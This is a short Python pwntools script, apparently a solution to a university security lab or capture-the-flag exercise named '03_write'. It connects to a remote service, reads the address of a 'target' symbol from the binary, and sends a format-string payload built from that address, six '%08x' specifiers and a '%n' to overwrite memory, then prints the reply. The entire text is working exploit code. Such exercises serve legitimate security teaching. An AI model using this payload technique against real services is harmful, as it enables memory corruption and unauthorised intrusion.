from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23193

s = remote(SERVER, PORT, timeout=9999)
elf = ELF("./03_write")
target_address = elf.symbols["target"]

s.sendline(p32(target_address) + b"%08x"*6 + b"%n")
s.recvline()
s.recvline()
response = s.recvline()
print(response.decode())
